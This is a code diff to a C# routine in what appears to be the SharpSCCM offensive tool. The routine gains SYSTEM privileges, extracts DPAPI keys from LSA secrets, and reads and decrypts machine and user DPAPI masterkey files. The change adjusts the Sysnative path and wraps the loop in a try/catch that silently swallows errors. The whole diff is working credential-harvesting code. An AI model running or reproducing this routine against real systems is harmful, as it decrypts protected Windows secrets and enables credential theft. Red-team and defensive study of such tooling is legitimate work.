@@ -131,67 +131,81 @@ namespace SharpSCCM
 
                 var keys = LSADump.GetDPAPIKeys(true);
                 Helpers.GetSystem();
-                var systemFolder = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Microsoft\\Protect\\";
+                var systemFolder = $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\Sysnative\\Microsoft\\Protect\\";
 
-                var systemDirs = Directory.GetDirectories(systemFolder);
 
-                foreach (var directory in systemDirs)
+                if (Directory.Exists(systemFolder))
                 {
-                    var machineFiles = Directory.GetFiles(directory);
-                    var userFiles = new string[0];
-
-                    if (Directory.Exists($"{directory}\\User\\"))
+                    try
                     {
-                        userFiles = Directory.GetFiles($"{directory}\\User\\");
+                        string[] systemDirs = Directory.GetDirectories(systemFolder);
+
+                        foreach (var directory in systemDirs)
+                        {
+                            var machineFiles = Directory.GetFiles(directory);
+                            var userFiles = new string[0];
+
+                            if (Directory.Exists($"{directory}\\User\\"))
+                            {
+                                userFiles = Directory.GetFiles($"{directory}\\User\\");
+                            }
+
+                            foreach (var file in machineFiles)
+                            {
+                                if (!Regex.IsMatch(file,
+                                        @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                                    continue;
+
+                                var fileName = Path.GetFileName(file);
+                                if (show)
+                                {
+                                    Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", file);
+                                }
+
+                                var masteyKeyBytes = File.ReadAllBytes(file);
+                                try
+                                {
+                                    // use the "machine" DPAPI key
+                                    var plaintextMasterkey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[0]);
+                                    mappings.Add(plaintextMasterkey.Key, plaintextMasterkey.Value);
+                                }
+                                catch (Exception e)
+                                {
+                                    Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
+                                }
+                            }
+
+                            foreach (var file in userFiles)
+                            {
+                                if (!Regex.IsMatch(file,
+                                        @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                                    continue;
+
+                                var fileName = Path.GetFileName(file);
+                                if (show)
+                                {
+                                    Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", file);
+                                }
+
+                                var masteyKeyBytes = File.ReadAllBytes(file);
+                                try
+                                {
+                                    // use the "user" DPAPI key
+                                    var plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[1]);
+                                    mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
+                                }
+                                catch (Exception e)
+                                {
+                                    Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+
                     }
 
-                    foreach (var file in machineFiles)
-                    {
-                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                            continue;
-
-                        var fileName = Path.GetFileName(file);
-                        if (show)
-                        {
-                            Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", file);
-                        }
-
-                        var masteyKeyBytes = File.ReadAllBytes(file);
-                        try
-                        {
-                            // use the "machine" DPAPI key
-                            var plaintextMasterkey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[0]);
-                            mappings.Add(plaintextMasterkey.Key, plaintextMasterkey.Value);
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
-                        }
-                    }
-
-                    foreach (var file in userFiles)
-                    {
-                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
-                            continue;
-
-                        var fileName = Path.GetFileName(file);
-                        if (show)
-                        {
-                            Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", file);
-                        }
-
-                        var masteyKeyBytes = File.ReadAllBytes(file);
-                        try
-                        {
-                            // use the "user" DPAPI key
-                            var plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[1]);
-                            mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
-                        }
-                    }
                 }
             }
             else
